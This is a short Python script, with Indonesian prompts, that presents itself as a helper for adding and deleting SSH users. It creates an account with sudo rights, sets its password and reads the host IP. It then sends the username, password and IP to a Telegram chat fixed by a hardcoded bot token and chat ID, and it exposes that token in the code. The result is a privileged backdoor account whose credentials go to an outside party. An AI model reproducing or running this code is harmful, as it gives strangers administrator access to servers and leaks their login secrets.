import os
import random
import string
import subprocess

import requests


def generate_random_string(length):
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def send_telegram_message(bot_token, chat_id, message):
    inline_keyboard = {"inline_keyboard": [[{"text": "Powered By", "url": "https://t.me/NorSodikin"}]]}
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown", "reply_markup": inline_keyboard}
    requests.post(url, json=data)


def add_ssh_user(ssh_username=None, ssh_password=None):
    bot_token = "7419614345:AAFwmSvM0zWNaLQhDLidtZ-B9Tzp-aVWICA"
    chat_id = "1964437366"

    ssh_username = input("Masukkan Nama Pengguna SSH (atau tekan Enter untuk menghasilkan nama pengguna acak): ")
    if not ssh_username:
        ssh_username = generate_random_string(8)

    ssh_password = input("Masukkan Kata Sandi SSH (atau tekan Enter untuk menghasilkan kata sandi acak): ")
    if not ssh_password:
        ssh_password = generate_random_string(12)

    try:
        result = subprocess.run(["id", ssh_username], capture_output=True, text=True)
        if result.returncode == 0:
            message = f"Pengguna {ssh_username} sudah ada. Silakan pilih nama pengguna yang berbeda."
        else:
            subprocess.run(
                ["sudo", "adduser", "--disabled-password", "--gecos", "", ssh_username, "--force-badname"], check=True
            )
            subprocess.run(["sudo", "chpasswd"], input=f"{ssh_username}:{ssh_password}", text=True, check=True)
            subprocess.run(["sudo", "usermod", "-aG", "sudo", ssh_username], check=True)

            hostname = os.popen("hostname -I").read().split()[0]

            message = (
                "*Informasi login SSH:*\n\n"
                f"*Nama Pengguna:* {ssh_username}\n"
                f"*Kata Sandi:* {ssh_password}\n"
                f"*Nama Host:* {hostname}\n\n"
                "_Gunakan informasi di atas untuk terhubung menggunakan PuTTY atau klien SSH apa pun._"
            )
    except Exception as e:
        message = f"Terjadi kesalahan: {str(e)}"

    send_telegram_message(bot_token, chat_id, message)


def delete_ssh_user(ssh_username):
    bot_token = "7419614345:AAFwmSvM0zWNaLQhDLidtZ-B9Tzp-aVWICA"
    chat_id = "1964437366"

    try:
        result = subprocess.run(["id", ssh_username], capture_output=True, text=True)
        if result.returncode != 0:
            message = f"Pengguna {ssh_username} tidak ada."
        else:
            subprocess.run(["sudo", "usermod", "--expiredate", "1", ssh_username], check=True)
            subprocess.run(["sudo", "deluser", "--remove-home", ssh_username], check=True)
            message = f"Pengguna {ssh_username} telah dihapus dari sistem dan tidak dapat lagi masuk."
    except Exception as e:
        message = f"Terjadi kesalahan: {str(e)}"

    send_telegram_message(bot_token, chat_id, message)
